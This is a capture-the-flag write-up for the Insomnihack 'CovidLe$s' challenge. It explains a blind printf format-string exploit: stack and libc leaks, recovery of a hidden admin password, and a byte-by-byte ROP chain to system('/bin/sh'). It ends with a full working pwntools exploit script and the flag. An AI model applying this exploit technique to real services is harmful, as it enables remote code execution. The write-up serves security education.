# CovidLe$s

## Challenge

Fully blind printf challenge.

No prompt when we connect.

if we type an input it is echoed back like so:

```
a
Your covid pass is invalid : a
try again ..
```

We are put in an infinite loop of this function:

```
a
Your covid pass is invalid : a
try again ..

b
Your covid pass is invalid : b
try again ..

c
Your covid pass is invalid : c
try again ..
```

## Solution

We first check for a format string vulnerability using an input with a format specifier:

```
%p
Your covid pass is invalid : 0x20
try again ..
```

The `%p` was replaced with `0x20`, so we know that our input is being handled like:

```c
printf(input);
```

If we write a lot of `%p`s we can get a look at the stack:

```
%p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p
Your covid pass is invalid : 0x400934 (nil) (nil) 0x633785efb4c0 0x633785cda8d0 0x74346e3143633456 0x505f44315f6e6f31 0x5379334b5f763172 0x5f74304e6e34635f 0xa6b34336c (nil) 0x7025207025207025 0x2520702520702520 0x2070252070252070 0x7025207025207025 0x2520702520702520 0x2070252070252070 0x7025207025207025 0x2520702520702520 0x2070252070252070 0x7025207025207025 0x2520702520702520 0x2070252070252070 0x7025207025207025 0x2520702520702520 0x2070252070252070 0xa7025207025 0x7680e5ae9bd0 0x452ac1aa9da7a00 0x400890 0x63378590eb97 0x1 0x7680e5ae9bd8 0x100008000 0x40075a (nil) 0x76dc8df8c37d7ab4 0x400650 0x7680e5ae9bd0 (nil) (nil) 0x9bdd4625e45d7ab4
try again ..
```

A few things stand out here:

- addresses such as 0x400934 and 0x40075a tell us that the binary has PIE disabled
- 0x63378590eb97 is a `libc.libc_start_main_return` address and can be used to leak the libc address and version
- 0x2070252070252070, 0x7025207025207025, and 0x2520702520702520 are our input as it is 3 characters repeated

There is also a series of values near the top of the stack that look like a string.
When decoded, we get `V4cC1n4t1on_1D_Pr1v_K3yS_c4nN0t_l34k`.
This is not the flag, but if we enter it into the program, it prints the following and exits:

```
V4cC1n4t1on_1D_Pr1v_K3yS_c4nN0t_l34k
Hello, admin
Nothing to do here
```

This is useful later as it allows us to return out of the infinite loop.

We can write our own addresses to the stack for an arbitrary read or write now.

I briefly looked at leaking the binary by writing addresses of the exe onto the stack and using `%s`.
This partially worked, but breaks for any address with a newline character, as `gets` will stop reading our input and we can't write the full address.

For the sake of completeness, it is possible to get a full binary leak even with this constraint.
If we know a stack address, we can write an exe address onto the stack to get past the limitation on `gets`.
This lets us leak from any address, including ones containing newlines.
For this challenge, leaking the binary was not necessary and I went on to solve it without the leak.

Looking at our stack dump again, we can see some high addresses that aren't libc addressess, such as 0x7680e5ae9bd8.
These are very likely stack addresses.
We can use this to start guessing our current RSP.

Since the stack grows down, we can start at this leaked address and decrement it by 8 bytes.
We know exactly where we are when the string printed matches the bytes we sent.

Once we have the stack address, we can write anywhere on the stack.
We can use this to build our ropchain to replace the libc address from earlier.

Finally, once we have a ropchain built, we can return out of the loop using the secret string leaked earlier.
Alternatively, we could have overwritten the secret with our own string, allowing us to skip the step of leaking it.

Either way, we then get a shell and can read the flag, as well as the binary.

```
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

The challenge was solvable with PIE enabled and full RELRO.

PIE disabled allows us to leak the binary if we choose to.

Partial RELRO opens up possibilities of overwriting GOT addresses instead of using a ropchain.
For example, overwriting the `printf` GOT entry would allow us to easily call `system("/bin/sh")`.

## Exploit

```py
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template --host covidless.insomnihack.ch --port 6666
from pwn import *

# Set up pwntools for the correct architecture
context.update(arch='amd64')
exe = './path/to/binary'
libc = ELF('libc6_2.27-3ubuntu1_amd64.so')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or 'covidless.insomnihack.ch'
port = int(args.PORT or 6666)

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

io = start()

payload = b""

for i in range(6, 11):
    payload += "%{}$p ".format(i).encode()

io.sendline(payload)

io.recvuntil(b"Your covid pass is invalid : ")

password = ""

for i in range(0, 5):
    leak = int(io.recvuntil(b" ", drop=True), 0)

    while leak > 0:
        password += chr(leak % 0x100)
        leak //= 0x100;

io.success("Password: {}".format(password))

io.sendlineafter(b"try again ..\n\n", b"%31$p")

io.recvuntil(b"Your covid pass is invalid : ")
leak = int(io.recvuntil(b"\n", drop=True), 0)
libc.address = leak - libc.libc_start_main_return

io.success("Libc: {}".format(hex(libc.address)))

io.sendlineafter(b"try again ..\n\n", b"%33$p")

io.recvuntil(b"Your covid pass is invalid : ")
leak = int(io.recvuntil(b"\n", drop=True), 0)
stack = leak

diff = 0

while True:
    addr = stack + diff
    payload = flat({
        0x0: b'%20$p<<< BEGIN >>>%20$s<<< END >>>',
        0x40: p64(addr),
    })

    io.sendlineafter(b"try again ..\n\n", payload)
    io.recvuntil(b"Your covid pass is invalid : ")
    io.info("trying " + io.recvuntil(b"<<< BEGIN >>>", drop=True).decode())
    leak = io.recvuntil(b"<<< END >>>", drop=True)
    if len(leak) > 0 and leak in p64(addr):
        io.info("Stack offset: {}".format(diff))
        break
    diff -= 0x8

stack = stack + diff - (14 * 0x8)
io.success("Stack: {}".format(hex(stack)))

def writeByteAtAddr(byte, addr):
    io.info("writing " + hex(byte) + " to " + hex(addr))
    fmt = ""

    if byte > 0:
        fmt += "%{}c".format(byte % 0x100)

    fmt += "%20$hhn"

    payload = flat({
        0x0: fmt.encode(),
        0x40: p64(addr),
    })
    io.sendlineafter(b"try again ..\n\n", payload)

def writeQwordAtOffset(qword, offset):
    base_addr = stack + offset * 8

    for i in range(0, 8):
        addr = base_addr + i
        byte = (qword >> (i * 8)) % 0x100
        writeByteAtAddr(byte, addr)

rop = ROP(libc)

writeQwordAtOffset(rop.find_gadget(["ret"])[0], 25)
writeQwordAtOffset(rop.find_gadget(["pop rdi", "ret"])[0], 26)
writeQwordAtOffset(next(libc.search(b"/bin/sh")), 27)
writeQwordAtOffset(libc.sym["system"], 28)

io.sendlineafter(b"try again ..\n\n", password.encode())

io.sendline(b"cat covidless")
io.sendline(b"echo '<<< END >>>'")

f = open("vuln", "wb")
f.write(io.recvuntil(b"<<< END >>>", drop=True))
f.close()

io.interactive()
```

## Flag

```
INS{F0rm4t_5tR1nGs_FuULly_Bl1nd_!Gj!}
```
